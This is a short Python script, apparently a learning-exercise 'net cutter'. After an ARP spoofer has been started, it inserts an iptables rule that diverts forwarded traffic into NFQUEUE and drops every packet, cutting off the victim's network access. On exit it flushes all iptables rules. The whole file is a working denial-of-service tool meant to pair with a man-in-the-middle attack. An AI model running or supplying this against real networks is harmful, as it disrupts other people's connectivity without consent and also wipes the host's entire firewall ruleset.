#!/usr/bin/env python3
import netfilterqueue
import subprocess


def process_packet(packet):
    packet.drop()
    print("Packet dropped")


try:
    # Execute first the arp spoofer
    # trap the incoming packets to a queue: iptables -I FORWARD -j NFQUEUE queue-num 0
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

except KeyboardInterrupt:
    print("closing cutter")
    subprocess.call("iptables --flush", shell=True)
